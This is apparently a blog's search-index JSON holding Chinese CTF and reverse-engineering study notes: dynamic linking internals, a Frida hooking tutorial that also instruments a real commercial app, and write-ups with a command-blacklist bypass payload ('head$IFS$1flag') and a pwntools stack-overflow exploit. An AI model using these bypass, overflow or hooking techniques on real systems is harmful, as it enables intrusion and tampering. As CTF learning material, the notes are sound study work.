保存原始的返回地址 pushq %rcx # 保存第一个参数 pushq %rdx # 保存第二个参数 # 传递 _dl_runtime_resolve 的参数给 _dl_fixup # 第一个参数（通常是符号索引）在 %rdi 中 # 第二个参数（返回地址）现在在栈顶 movq (%rsp), %rsi # 将返回地址移动到 %rsi # 调用 _dl_fixup 来解析符号地址 # _dl_fixup(符号索引, 返回地址) call _dl_fixup # _dl_fixup 返回解析后的函数地址在 %rax 中 # 恢复寄存器 popq %rdx # 恢复第二个参数 popq %rcx # 恢复第一个参数 popq %rax # 恢复原始的返回地址 # 使用解析后的地址跳转执行目标函数 # 这里我们假设解析后的地址已经由 _dl_fixup 放入 %rax 中 jmp *%rax # _dl_fixup 函数的伪声明，需要实际实现 .type _dl_fixup, @function _dl_fixup: # 实际的 _dl_fixup 实现会在这里 ret \"]},\"21\":{\"h\":\"_dl_runtime_resolve部分详细解说\",\"t\":[\"参考文章:深入理解-dl_runtime_resolve - unr4v31 - 博客园 (cnblogs.com)\",\"_dl_runtime_resolve(link_map_obj, reloc_index) \"]},\"22\":{\"h\":\"reloc_index\",\"t\":[\"省略点将 我们可以通过reloc_index知道我们要绑定函数的名字 其获取逻辑是:\",\"elf_rel = rel_plt[reloc_index]; r_info = elf_rel.r_info; elf_sym = *(r_info); st_name = elf.sym.st_name; // 这里的function_name就是我们需要的函数名了 function_name = dynstr[st_name]; \",\"这个参数 可以粗俗得当作一个属于.rel.plt这个数组的下标 就像是: .rel.plt[reloc_index]\",\"type ELF_Rel struct { r_offset int64 r_info int } rel.plt = []Elf_Rel{} \",\"r_offset: 存储 我们需要修改的plt条目的位置 相当于是告诉我们PLT[N]中的这个N 但是其实这里r_offset是一个绝对地址 相当于:&PLT[N]\",\"r_info高位3字节 用来表示 .dynsym这个数组的下标 也就是.dynsym[r_info]\",\"然后.dynsym[r_info].st_name获取我们需要的函数名字在.dynstr数组中的下标 然后我们就可以通过.dynstr[st_name]来获取名字了\",\"所以总结一下:\",\".dynstr存函数名字\",\".dynsym存函数名字在.dynstr中的位置\",\".rel_plt存我们需要.dynsym中哪个结构体 方便我们取出名字\"]},\"23\":{\"h\":\"frida的基本使用\",\"t\":[\"参考文章Android之Frida框架完全使用指南_android frida-CSDN博客推荐下载书的网站:无名图书 | 一个好看的电子书网站 (book123.info)\"]},\"24\":{\"h\":\"映射端口:\",\"t\":[\"adb forward tcp:xxxx tcp:xxxx \"]},\"25\":{\"h\":\"pc查询手机的进程\",\"t\":[\"frida-ps -U \"]},\"26\":{\"h\":\"hook相关\"},\"27\":{\"h\":\"hook js脚本\"},\"28\":{\"h\":\"附着脚本\",\"t\":[\"启动并且附带脚本\",\"frida -U -f xxxxxx.apk -l xxx.js --no-pause \",\"这里的--no-pause意思是在程序启动后不要停止程序的进程\",\"这里也可以在启动后再 去hook脚本\",\"frida -U -f xxxxx.apk --no-pause %load xxxx.js \"]},\"29\":{\"h\":\"js代码的书写\"},\"30\":{\"h\":\"使用java的平台\",\"t\":[\"使用java平台—>Java.perform(function () {}); \",\"相当于向java层提供了一个callback函数 以便于交互\"]},\"31\":{\"h\":\"获取指定的java类\",\"t\":[\"Java.use(className) \",\"这里引用一下参考文章的列子\",\"当我们获取到Java类之后，我们直接通过 <wrapper>.<method>.implementations =function() {}的方式来hook wrapper类的method方法，不管是实例方法还是静态方法都可以\",\"function main() { //使用java平台 Java.perform( function() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //hook Add方法(重写Add方法) student.Add.implementation=function(a,b) { //修改参数 a=123; b=456; //调用原来的函数 var res = this.Add(a,b); //输出结果 console.log(a,b,res); return res; } } ); } setImmediate(main) \"]},\"32\":{\"h\":\"调用原本的函数\",\"t\":[\"上面举的列子 中出现了调用原本的函数 所以我们其实可以在callback函数里面用this.FUNCTION_NAME来调用原本的函数\",\"<wrapper>.<method>.implementations =function() { this.<method>(); } \"]},\"33\":{\"h\":\"hook重载函数\",\"t\":[\"这里重载函数是java里面的一个特性 就是同一个函数名字 不同的参数列表 可以构造多个同名字的函数 在调用的时候只需要修改参数就可以实现调用不同的实现由于函数名字是一样的所以我猜测frida就难以仅仅靠一个名字来实现hook了 所以我们需要overload标明参数\",\"类似文章中举列子的一样\",\"要hook的代码\",\"public class Student { static public int Add(int a,int b){ return a+b; } static public String test(){ return \\\"test\\\"; } // 要hook的函数 static public String test(int num){ return \\\"test2--\\\"+num; } static public String test(String str){ return str; } } \",\"js代码\",\"//hook重载方法 function hookTest1() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //hook test student.test.overload('int').implementation=function(a) { //修改参数 a=123; //调用原来的函数 var res = this.test(a); //输出结果 console.log(a,res); return res; } } \",\"获取某个重载函数的全部数量\",\"<class>.<function>.overloads.length; \",\"用提取数组的方式依次hook这些重载函数\",\"//hook所有重载函数 function hookTest2() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //重载方法的个数 var overlength=student.test.overloads.length; //循环hook所有重载方法 for(var i=0;i<overlength;i++) { student.test.overloads[i].implementation=function() { //打印参数个数 console.log(arguments.length); return this.test.apply(this,arguments); } } } \"]},\"34\":{\"h\":\"hook构造方法\",\"t\":[\"这里先解释一下什么是构造方法java中类在定义的时候 程序员可以选择显性地去书写和类同名地一个public方法 也可以不写 java会自动给你补上(粗鄙理解)这个方法有什么用呢 就是在这个类实列化的时候 触发 完成类似于初始化的操作比如现在我有类Student那么我在Student a = new Student();的时候相当于会自动去调用函数:a.Student();由于这个是开发知识就不细讲了()\",\"稍微举列子:\",\"package dick; public class Test { public Test() { System.out.print(\\\"test\\\"); } } public class dick { public static void main (String[] args) { Test a = new Test(); } } // 结果:test \",\"对应js的写法\",\"//hook构造函数 function hookTest3() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Test\\\"); student.$init.implementation=function() { //调用原函数 this.$init(name,age); //调用构造函数 //student.$new(\\\"guishou\\\",888); } } \"]},\"35\":{\"h\":\"修改类的字段\",\"t\":[\"这里的字段指的是类中定义的成员属性然后这里修改非静态的字段用到的是java.choose函数 这个函数第一个参数就是我们要遍历的类随后我们放入一个类似于回调函数的对象进去这个对象包含:\",\"onMatch\",\"这个key对应的value是一个callback函数 这里会去找到程序中所有实现了指定类的对象 也就是找到所有类型为这个类的对象\",\"相当于遍历 没找到一个对象就会触发这个callback 所以在callback函数中我们的操作对象是每一个对象\",\"onCompete\",\"这个key对应的value也是一个callback函数 在整个搜索流程完成的时候会调用\",\"import java.lang.System.Logger; public class Student { public String name; public int age; private int number; private static String nickname = \\\"Flags\\\"; public Student (String name,int age){ this.age = age; this.name = name; } public void PrintStudent(){ this.number = 888; Log.d(this.name,\\\"nickName:\\\"+this.nickname+\\\"number:\\\"+this.number); } public static void main(String[] args) { System.out.println(\\\"Hello World\\\"); } } \",\"我们这里选择修改nickname这个属性\",\"//修改类字段 function hookTest4() { //获取java类 var student=Java.use(\\\"com.example.hookdemo01.Student\\\"); //修改静态字段 student.nickname.value=\\\"GuiShouFlags\\\"; console.log(student.nickname.value); //修改非静态字段 Java.choose(\\\"com.example.hookdemo01.Student\\\",{ //每遍历一个对象都会调用onMatch onMatch:function(obj) { //修改每个对象的字段 obj.number.value=999; console.log(obj.number.value); //字段名和函数名相同需要加下划线 //obj._number.value=999; }, //遍历完成后调用onComplete onComplete:function() { } }); } \"]},\"36\":{\"h\":\"枚举所有的类和方法\",\"t\":[\"这里很多前提知识\",\"function hookTest6() { //枚举已经加载的类 异步方式 Java.enumerateLoadedClasses({ //每枚举一个类调用一次 onMatch:function(name,handler) { //对类名进行过滤 if(name.indexOf(\\\"com.example.hookdemo01\\\")!=-1) { //输出类名 console.log(name); //根据类名获取java类 var clz=Java.use(name); //获取类的所有方法 var methods=clz.class.getDeclaredMethods(); //循环输出所有方法 for(var i=0;i<methods.length();i++) { console.log(methods[i]); } } }, //枚举完成以后调用 onComplete:function() { } }); //枚举已经加载的类 同步方式 var classes=Java.enumerateClassLoadersSync(); for(var i=0;i<methods.classes();i++) { if(classes[i].indexOf(\\\"com.example.hookdemo01\\\")!=-1) { console.log(classes[i]); //枚举方法同上... } } } \"]},\"37\":{\"h\":\"hook so中的函数\",\"t\":[\"这里如果这个函数不是导出函数则我们通过偏移来获取这个函数这个步骤 就是算偏移嘛(应该 错了别打我) libcBaseAddr + offset\",\"//hook无导出函数 function hookTest9() { //so名称 var so_name=\\\"libnative-lib.so\\\"; //要Hook的函数偏移 var fun_off=0x7078; //加载到内存后，函数地址=so地址+函数偏移 var so_base_addr=Module.findBaseAddress(so_name); var add_func=parseInt(so_base_addr,16)+fun_off; var ptr_fun=new NativePointer(add_func); Interceptor.attach(ptr_fun,{ //在hook函数之前执行 onEnter:function(args) { console.log(\\\"hook enter\\\"); }, //在hook函数之后执行 onLeave:function(retval) { console.log(\\\"hook leaver\\\"); } }); } \"]},\"38\":{\"h\":\"frida的反调试\",\"t\":[\"这里学习到的 我们调试一个程序的时候 我们首先要获取它的包名提前声明这里实战 只是为了学习 学习经验()\"]},\"39\":{\"h\":\"实战\"},\"40\":{\"h\":\"获取包名\",\"t\":[\"这里看教程大概就是 去找到AndroidMainfest.xml文件 然后搜索package=xxxx这个xxxx就是包的名字 \",\"这里我们拿到包名字:com.netease.x19\"]},\"41\":{\"h\":\"hook 一个测试脚本\",\"t\":[\"function main() { Java.enumerateLoadedClasses({ onMatch: function(name, handler) { if(name.indexOf(\\\"com.netease.x19\\\") != -1) { console.log(name); var clz = Java.use(name); var methods = clz.class.getDeclaredMethods(); for(var i = 0; i < methods.length; i++) { console.log(\\\"name:\\\", name, \\\"methods:\\\", methods[i]); } } }, onComplete: function() { } }); } setImmediate( function(){ console.log(\\\"test\\\") Java.perform(main); } ) \",\"然后\",\"我们执行指令\",\"frida -U -f com.netease.x19 -l hook.js --no-pause \",\"然后发生报错:\",\"usage: frida [options] target frida: error: unrecognized arguments: --no-pause \",\"这里搜了去 发现frida在新版本中移除了--no-pause 所以我们就不带这个了\",\"执行完上面的hook指令后发现了报错\",\"Failed to spawn: need Gadget to attach on jailed Android; its default location is: C:\\\\Users\\\\61428\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\frida\\\\gadget-android-arm64.so \",\"然后搜索发现是我修改了默认的端口号为11451 所以我带上参数:-H 127.0.0.1:11451\",\"frida -H 127.0.0.1:11451 -f com.netease.x19 -l hook.js \",\"执行成功\",\" ____ / _ | Frida 16.1.8 - A world-class dynamic instrumentation toolkit | (_| | > _ | Commands: /_/ |_| help -> Displays the help system . . . . object? -> Display information about 'object' . . . . exit/quit -> Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to 127.0.0.1:11451 (id=socket@127.0.0.1:11451) Spawned `com.netease.x19`. Resuming main thread! [Remote::com.netease.x19 ]-> \",\"然后我们得到了一堆数据 太多了 这里放不下 接下来我们需要筛选(留着后天来写)\"]},\"42\":{\"h\":\"objection 初次体验\"},\"43\":{\"h\":\"连接\",\"t\":[\"第一次我使用的教程上面说的:objection -g <应用标识符> explore但是报错:\",\"Unable to connect to the frida server: need Gadget to attach on jailed Android; its default location is:..... \",\"我猜测大概是因为我们frida修改了端口号 所以我们尝试objection -g com.netease.x19 explore -P 11451\"]},\"44\":{\"h\":\"nc签到题(常用指令绕过)\",\"t\":[\"第一次拿到这个附件 丢进ida里面没用 后缀改为.zip 也没有看见什么东西 一筹莫展 拿这玩意丢进虚拟机里面跑了一下 发现了import无效指令 所以才改后缀为py 才看见代码\",\"import os art = ''' (( \\\"####@@!!$$ )) `#####@@!$$` )) (( '####@!!$: (( ,####@!!$: )) .###@!!$: `##@@!$: `#@!!$ !@# `#@!$: @#$ #$ `#@!$: !@! '@!$: '`\\\\ \\\"!$: /`' '\\\\ '!: /' \\\"\\\\ : /\\\" -.\\\"-/\\\\\\\\\\\\-.\\\"//.-\\\"/:`\\\\.\\\"-.JrS\\\".\\\"-=_\\\\\\\\ \\\" -.\\\"-.\\\\\\\\\\\"-.\\\"//.-\\\".`-.\\\"_\\\\\\\\-.\\\".-\\\\\\\".-//''' print(art) print(\\\"My_shell_ProVersion\\\") blacklist = ['cat','ls',' ','cd','echo','<','${IFS}'] while True: command = input() for i in blacklist: if i in command: exit(0) os.system(command) \"]},\"45\":{\"h\":\"linux中常用的指令\",\"t\":[\"1、cat命令—用于将文件内容输出到终端上，经常使用于查看文本文件的内容。\",\"2、less命令—用于分页查看文件内容，可以向上翻页、向下翻页、搜索关键字等，合适查看大文件。\",\"less [options] file_name \",\"options: \",\"-N 或 --LINE-NUMBERS：显示每行的行号。\",\"-S 或 --chop-long-lines：不折行长行。默认情况下，less 会折行显示超出屏幕宽度的长行。使用此选项后，长行将不会被折行，而是横向滚动显示。\",\"-M 或 --LONG-PROMPT：显示更详细的提示信息，包括文件的百分比位置等。\",\"-i 或 --ignore-case：在搜索时忽略大小写。默认情况下，less 的搜索是区分大小写的。\",\"-g 或 --hilite-search：仅高亮显示最后一次搜索匹配的字符串。\",\"-E 或 --QUIT-AT-EOF：在到达文件末尾时自动退出。\",\"-m 或 --LONG-PROMPT：显示百分比表示的文件位置。\",\"-R 或 --RAW-CONTROL-CHARS：显示控制字符（如颜色代码）。\",\"-X 或 --no-init：不清空屏幕。在退出 less 时，屏幕上显示的文本不会被清除。\",\"-F 或 --quit-if-one-screen：如果文件内容能够在一屏内显示完毕，则自动退出 less。\",\"-? 或 --help：显示帮助信息。\",\"键盘操作:\",\"Space 或 f：向下滚动一页。\",\"b：向上滚动一页。\",\"Arrow keys：逐行滚动。\",\"/：向下搜索字符串。\",\"?：向上搜索字符串。\",\"n：重复上一次搜索（向下）。\",\"N：重复上一次搜索（向上）。\",\"q：退出 less。\",\"3、more命令—与less类似，也是用于分页查看文件内容，但是功能较少，只能向下翻页。\",\"more [options] file_name \",\"4、head命令—用于查看文件的前几行内容，默许情况下显示前10行。\",\"head [options] [file...] \",\"其中，[file...] 是一个或多个文件名。如果没有指定文件，或者文件名为 -，head 会从标准输入读取数据。\",\"-n [数值] 或 --lines=[数值]：显示文件开始的指定行数。例如，head -n 5 file.txt 会显示 file.txt 的前 5 行。\",\"-c [数值] 或 --bytes=[数值]：显示文件开始的指定字节数。例如，head -c 100 file.txt 会显示 file.txt 的前 100 个字节。\",\"-q 或 --quiet：在处理多个文件时不打印每个文件的名称作为头部。\",\"-v 或 --verbose：总是打印每个文件的名称作为头部。\",\"5、tail命令—用于查看文件的后几行内容，默许情况下显示文件的最后10行。 6、nl命令—用于在文件中加上行号，便于查看和编辑文件。 7、vi/vim命令—是一种文本编辑器，可以用于查看和编辑文件内容，适用于高级用户。\"]},\"46\":{\"h\":\"IFS变量\",\"t\":[\"这里提到IFS作为Shell的内置变量，是一个用于分割字段的字符列表\"]},\"47\":{\"h\":\"IFS 的工作原理\",\"t\":[\"IFS 是一个特殊的 shell 变量，用于定义字段边界。它告诉 shell 如何解释序列和字段分隔符。这对于文本解析、命令行参数处理以及读取和解析数据至关重要。\",\"默认情况下，IFS 包含空格、制表符和换行符。这意味着 shell 在处理文本时会将这些字符视为字段之间的分隔符。\",\"更改 IFS 的值可以改变 shell 解释数据的方式。这特别有用于处理非标准格式的数据。\"]},\"48\":{\"h\":\"这里举列子:\",\"t\":[\"IFS=',' line=\\\"apple,banana,cherry\\\" for fruit in $line; do echo $fruit done # 输出：apple banana cherry \"]},\"49\":{\"h\":\"payload\",\"t\":[\"head$IFS$1flag\"]},\"50\":{\"h\":\"siscn_pwn1(栈迁移+float数据格式)\",\"t\":[\"看一下题发现应该是比较简单的 由于有个gets函数 所以我有点想直接覆盖数据为11.28125\",\"int func() { char v1[44]; // [rsp+0h] [rbp-30h] BYREF float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(\\\"Let's guess the number.\\\"); gets(v1); if ( v2 == 11.28125 ) return system(\\\"cat /flag\\\"); else return puts(\\\"Its value should be 11.28125\\\"); } \",\"保护\",\"[*] '/home/agentalbrazee/work/ctf/pwn/cp/nssctf/pwn1/pwn1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \"]},\"51\":{\"h\":\"实验float的存储数据\",\"t\":[\"为了实验一下 我们手搓一个程序 gdb调试一下\",\"#include<stdio.h> int main() { float a; a = 11.28125; printf(\\\"The value of a is %f\\\\n\\\",a); } \",\"获取结果:\",\"► 0x5555555551c7 <main+62> call __isoc99_scanf@plt <__isoc99_scanf@plt> format: 0x555555556004 ◂— 0x7620656854006625 /* '%f' */ vararg: 0x7fffffffdee4 ◂— 0xc7df9b0041348000 \",\"那么我们就知道了 这里的存储数据为0xc7df9b0041348000\",\"但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来\",\"int __cdecl main(int argc, const char **argv, const char **envp) { float v4; // [rsp+2Ch] [rbp-4h] BYREF _main(argc, argv, envp); v4 = 11.28125; scanf(\\\"%f\\\", &v4); printf(\\\"The value of a is %f\\\\n\\\", v4); return 0; } \",\"然后在scanf里面下idapython脚本:\",\"import idc print(\\\"rax\\\",hex(idc.get_reg_value(\\\"rax\\\"))) \",\"获取数据:rax 0x61fe1c 好像还是不太对\",\"(太笨了)最后我们直接在程序源代码重找cmp的部分找到了\",\".rodata:00000000004007F4 00 80 34 41 dword_4007F4 dd 41348000h \"]},\"52\":{\"h\":\"尝试覆盖\",\"t\":[\"from pwn import * # r = remote(\\\"node5.anna.nssctf.cn\\\",28355) r = gdb.debug(\\\"./pwn1\\\",\\\"b main\\\") print(r.recvuntil(b\\\"Let's guess the number.\\\\n\\\")) payload = b\\\"a\\\"*(0x30 - 4) +p32(0x41348000) r.sendline(payload) r.interactive() \",\"最后成功\"]},\"53\":{\"h\":\"Posts\"},\"54\":{\"h\":\"Android\"},\"55\":{\"h\":\"Nssctf\"}},\"dirtCount\":0,\"index\":[[\"最后成功\",{\"1\":{\"52\":1}}],[\"最后我们直接在程序源代码重找cmp的部分找到了\",{\"1\":{\"51\":1}}],[\"最后我们jmp过去\",{\"1\":{\"20\":1}}],[\"尝试覆盖\",{\"0\":{\"52\":1}}],[\"太笨了\",{\"1\":{\"51\":1}}],[\"太多了\",{\"1\":{\"41\":1}}],[\"好像还是不太对\",{\"1\":{\"51\":1}}],[\"◂\",{\"1\":{\"51\":2}}],[\"►\",{\"1\":{\"51\":1}}],[\"为了实验一下\",{\"1\":{\"51\":1}}],[\"保护\",{\"1\":{\"50\":1}}],[\"保存第二个参数\",{\"1\":{\"20\":1}}],[\"保存第一个参数\",{\"1\":{\"20\":1}}],[\"保存原始的返回地址\",{\"1\":{\"20\":1}}],[\"保存寄存器\",{\"1\":{\"20\":1}}],[\"看一下题发现应该是比较简单的\",{\"1\":{\"50\":1}}],[\"解释数据的方式\",{\"1\":{\"47\":1}}],[\"更改\",{\"1\":{\"47\":1}}],[\"制表符和换行符\",{\"1\":{\"47\":1}}],[\"包含空格\",{\"1\":{\"47\":1}}],[\"包括文件的百分比位置等\",{\"1\":{\"45\":1}}],[\"命令行参数处理以及读取和解析数据至关重要\",{\"1\":{\"47\":1}}],[\"它告诉\",{\"1\":{\"47\":1}}],[\"变量\",{\"1\":{\"47\":1}}],[\"适用于高级用户\",{\"1\":{\"45\":1}}],[\"是一个特殊的\",{\"1\":{\"47\":1}}],[\"是一个用于分割字段的字符列表\",{\"1\":{\"46\":1}}],[\"是一个或多个文件名\",{\"1\":{\"45\":1}}],[\"是一种文本编辑器\",{\"1\":{\"45\":1}}],[\"7\",{\"1\":{\"45\":1}}],[\"便于查看和编辑文件\",{\"1\":{\"45\":1}}],[\"总是打印每个文件的名称作为头部\",{\"1\":{\"45\":1}}],[\"个字节\",{\"1\":{\"45\":1}}],[\"行\",{\"1\":{\"45\":1}}],[\"例如\",{\"1\":{\"45\":2}}],[\"数值\",{\"1\":{\"45\":4}}],[\"会显示\",{\"1\":{\"45\":2}}],[\"会从标准输入读取数据\",{\"1\":{\"45\":1}}],[\"会折行显示超出屏幕宽度的长行\",{\"1\":{\"45\":1}}],[\"其中\",{\"1\":{\"45\":1}}],[\"其获取逻辑是\",{\"1\":{\"22\":1}}],[\"默许情况下显示文件的最后10行\",{\"1\":{\"45\":1}}],[\"默许情况下显示前10行\",{\"1\":{\"45\":1}}],[\"默认情况下\",{\"1\":{\"45\":2,\"47\":1}}],[\"默认值为\",{\"1\":{\"6\":1}}],[\"41348000h\",{\"1\":{\"51\":1}}],[\"41\",{\"1\":{\"51\":1}}],[\"4h\",{\"1\":{\"50\":1,\"51\":1}}],[\"44\",{\"1\":{\"50\":1}}],[\"4\",{\"1\":{\"45\":1,\"52\":1}}],[\"4007f4\",{\"1\":{\"51\":1}}],[\"40\",{\"1\":{\"11\":4}}],[\"只能向下翻页\",{\"1\":{\"45\":1}}],[\"只是为了学习\",{\"1\":{\"38\":1}}],[\"退出\",{\"1\":{\"45\":1}}],[\"逐行滚动\",{\"1\":{\"45\":1}}],[\"keys\",{\"1\":{\"45\":1}}],[\"keeping\",{\"1\":{\"8\":1}}],[\"向上\",{\"1\":{\"45\":1}}],[\"向上搜索字符串\",{\"1\":{\"45\":1}}],[\"向上滚动一页\",{\"1\":{\"45\":1}}],[\"向下\",{\"1\":{\"45\":1}}],[\"向下搜索字符串\",{\"1\":{\"45\":1}}],[\"向下滚动一页\",{\"1\":{\"45\":1}}],[\"向下翻页\",{\"1\":{\"45\":1}}],[\"键盘操作\",{\"1\":{\"45\":1}}],[\"则自动退出\",{\"1\":{\"45\":1}}],[\"如何解释序列和字段分隔符\",{\"1\":{\"47\":1}}],[\"如果没有指定文件\",{\"1\":{\"45\":1}}],[\"如果文件内容能够在一屏内显示完毕\",{\"1\":{\"45\":1}}],[\"如颜色代码\",{\"1\":{\"45\":1}}],[\"屏幕上显示的文本不会被清除\",{\"1\":{\"45\":1}}],[\"时\",{\"1\":{\"45\":1}}],[\"仅高亮显示最后一次搜索匹配的字符串\",{\"1\":{\"45\":1}}],[\"显示文件开始的指定字节数\",{\"1\":{\"45\":1}}],[\"显示文件开始的指定行数\",{\"1\":{\"45\":1}}],[\"显示帮助信息\",{\"1\":{\"45\":1}}],[\"显示控制字符\",{\"1\":{\"45\":1}}],[\"显示百分比表示的文件位置\",{\"1\":{\"45\":1}}],[\"显示更详细的提示信息\",{\"1\":{\"45\":1}}],[\"显示每行的行号\",{\"1\":{\"45\":1}}],[\"而是横向滚动显示\",{\"1\":{\"45\":1}}],[\"而在fastbin为空时\",{\"1\":{\"6\":1}}],[\"长行将不会被折行\",{\"1\":{\"45\":1}}],[\"或者文件名为\",{\"1\":{\"45\":1}}],[\"或\",{\"1\":{\"45\":16}}],[\"合适查看大文件\",{\"1\":{\"45\":1}}],[\"合并后会被放入unsorted\",{\"1\":{\"6\":1}}],[\"搜索关键字等\",{\"1\":{\"45\":1}}],[\"经常使用于查看文本文件的内容\",{\"1\":{\"45\":1}}],[\"`\",{\"1\":{\"44\":9}}],[\"`com\",{\"1\":{\"41\":1}}],[\"才看见代码\",{\"1\":{\"44\":1}}],[\"才会放入fastbin\",{\"1\":{\"7\":1}}],[\"发现了import无效指令\",{\"1\":{\"44\":1}}],[\"发现frida在新版本中移除了\",{\"1\":{\"41\":1}}],[\"拿这玩意丢进虚拟机里面跑了一下\",{\"1\":{\"44\":1}}],[\"zip\",{\"1\":{\"44\":1}}],[\"zhihu\",{\"1\":{\"20\":1}}],[\"后缀改为\",{\"1\":{\"44\":1}}],[\"后一个chunk的指针\",{\"1\":{\"14\":1}}],[\"丢进ida里面没用\",{\"1\":{\"44\":1}}],[\"常用指令绕过\",{\"0\":{\"44\":1}}],[\"我猜测大概是因为我们frida修改了端口号\",{\"1\":{\"43\":1}}],[\"我们手搓一个程序\",{\"1\":{\"51\":1}}],[\"我们执行指令\",{\"1\":{\"41\":1}}],[\"我们首先要获取它的包名提前声明这里实战\",{\"1\":{\"38\":1}}],[\"我们调试一个程序的时候\",{\"1\":{\"38\":1}}],[\"我们直接通过\",{\"1\":{\"31\":1}}],[\"我们需要修改的plt条目的位置\",{\"1\":{\"22\":1}}],[\"我们可以通过reloc\",{\"1\":{\"22\":1}}],[\"我们可以发现这个地方fd和bk都指向了\",{\"1\":{\"9\":1}}],[\"我们假设我们的函数在plt\",{\"1\":{\"20\":1}}],[\"我们程序究竟是怎么运行的\",{\"1\":{\"20\":1}}],[\"我们主要探讨在第一次数据绑定的时候\",{\"1\":{\"20\":1}}],[\"我们这里选择修改nickname这个属性\",{\"1\":{\"35\":1}}],[\"我们这里开始简单运算一下\",{\"1\":{\"11\":1}}],[\"我们这里知道了第七个地址\",{\"1\":{\"9\":1}}],[\"我们通过连续申请8个gundam\",{\"1\":{\"9\":1}}],[\"我们来到了leave\",{\"1\":{\"4\":1}}],[\"我们只要能够实现这两个部分就可以了\",{\"1\":{\"4\":1}}],[\"我们在ebp这个位置放入我们我们希望这个栈最终落脚点\",{\"1\":{\"4\":1}}],[\"连接\",{\"0\":{\"43\":1}}],[\"初次体验\",{\"0\":{\"42\":1}}],[\"留着后天来写\",{\"1\":{\"41\":1}}],[\"接下来我们需要筛选\",{\"1\":{\"41\":1}}],[\"接下来我们需要理解\",{\"1\":{\"4\":1}}],[\"quiet\",{\"1\":{\"45\":1}}],[\"quit\",{\"1\":{\"41\":1,\"45\":2}}],[\"q\",{\"1\":{\"45\":2}}],[\"qword\",{\"1\":{\"11\":1}}],[\"执行成功\",{\"1\":{\"41\":1}}],[\"执行完上面的hook指令后发现了报错\",{\"1\":{\"41\":1}}],[\"6\",{\"1\":{\"45\":1}}],[\"61428\",{\"1\":{\"41\":1}}],[\"64\",{\"1\":{\"20\":1,\"50\":1}}],[\"64b\",{\"1\":{\"6\":1}}],[\"函数地址=so地址+函数偏移\",{\"1\":{\"37\":1}}],[\"函数的伪声明\",{\"1\":{\"20\":1}}],[\"加载到内存后\",{\"1\":{\"37\":1}}],[\"错了别打我\",{\"1\":{\"37\":1}}],[\"应该\",{\"1\":{\"37\":1}}],[\"同步方式\",{\"1\":{\"36\":1}}],[\"同一个地址\",{\"1\":{\"9\":1}}],[\"循环输出所有方法\",{\"1\":{\"36\":1}}],[\"循环hook所有重载方法\",{\"1\":{\"33\":1}}],[\"根据类名获取java类\",{\"1\":{\"36\":1}}],[\"输出\",{\"1\":{\"48\":1}}],[\"输出类名\",{\"1\":{\"36\":1}}],[\"输出结果\",{\"1\":{\"31\":1,\"33\":1}}],[\"对类名进行过滤\",{\"1\":{\"36\":1}}],[\"对应js的写法\",{\"1\":{\"34\":1}}],[\"异步方式\",{\"1\":{\"36\":1}}],[\"枚举方法同上\",{\"1\":{\"36\":1}}],[\"枚举完成以后调用\",{\"1\":{\"36\":1}}],[\"枚举已经加载的类\",{\"1\":{\"36\":2}}],[\"枚举所有的类和方法\",{\"0\":{\"36\":1}}],[\"遍历完成后调用oncomplete\",{\"1\":{\"35\":1}}],[\"字段名和函数名相同需要加下划线\",{\"1\":{\"35\":1}}],[\"每枚举一个类调用一次\",{\"1\":{\"36\":1}}],[\"每遍历一个对象都会调用onmatch\",{\"1\":{\"35\":1}}],[\"每条链上最多可以有7个chunk\",{\"1\":{\"7\":1}}],[\"没找到一个对象就会触发这个callback\",{\"1\":{\"35\":1}}],[\"修改每个对象的字段\",{\"1\":{\"35\":1}}],[\"修改非静态字段\",{\"1\":{\"35\":1}}],[\"修改静态字段\",{\"1\":{\"35\":1}}],[\"修改类字段\",{\"1\":{\"35\":1}}],[\"修改类的字段\",{\"0\":{\"35\":1}}],[\"修改参数\",{\"1\":{\"31\":1,\"33\":1}}],[\"稍微举列子\",{\"1\":{\"34\":1}}],[\"完成类似于初始化的操作比如现在我有类student那么我在student\",{\"1\":{\"34\":1}}],[\"触发\",{\"1\":{\"34\":1}}],[\"触发unlink漏洞\",{\"1\":{\"13\":1}}],[\"粗鄙理解\",{\"1\":{\"34\":1}}],[\"程序员可以选择显性地去书写和类同名地一个public方法\",{\"1\":{\"34\":1}}],[\"程序会自动保存下一个指令的地址\",{\"1\":{\"4\":1}}],[\"打印参数个数\",{\"1\":{\"33\":1}}],[\"要hook的函数偏移\",{\"1\":{\"37\":1}}],[\"要hook的函数\",{\"1\":{\"33\":1}}],[\"要hook的代码\",{\"1\":{\"33\":1}}],[\"类似文章中举列子的一样\",{\"1\":{\"33\":1}}],[\"就是算偏移嘛\",{\"1\":{\"37\":1}}],[\"就是在这个类实列化的时候\",{\"1\":{\"34\":1}}],[\"就是同一个函数名字\",{\"1\":{\"33\":1}}],[\"就像是\",{\"1\":{\"22\":1}}],[\"上面举的列子\",{\"1\":{\"32\":1}}],[\"重复上一次搜索\",{\"1\":{\"45\":2}}],[\"重载方法的个数\",{\"1\":{\"33\":1}}],[\"重写add方法\",{\"1\":{\"31\":1}}],[\"重要知识点\",{\"0\":{\"6\":1}}],[\"不清空屏幕\",{\"1\":{\"45\":1}}],[\"不折行长行\",{\"1\":{\"45\":1}}],[\"不同的参数列表\",{\"1\":{\"33\":1}}],[\"不管是实例方法还是静态方法都可以\",{\"1\":{\"31\":1}}],[\"不大于\",{\"1\":{\"6\":1}}],[\"<main+62>\",{\"1\":{\"51\":1}}],[\"<method>\",{\"1\":{\"31\":1,\"32\":2}}],[\"<应用标识符>\",{\"1\":{\"43\":1}}],[\"<\",{\"1\":{\"41\":1,\"44\":1,\"51\":1}}],[\"<function>\",{\"1\":{\"33\":1}}],[\"<class>\",{\"1\":{\"33\":1}}],[\"<wrapper>\",{\"1\":{\"31\":1,\"32\":1}}],[\"<=>\",{\"1\":{\"15\":6}}],[\"获取数据\",{\"1\":{\"51\":1}}],[\"获取结果\",{\"1\":{\"51\":1}}],[\"获取包名\",{\"0\":{\"40\":1}}],[\"获取类的所有方法\",{\"1\":{\"36\"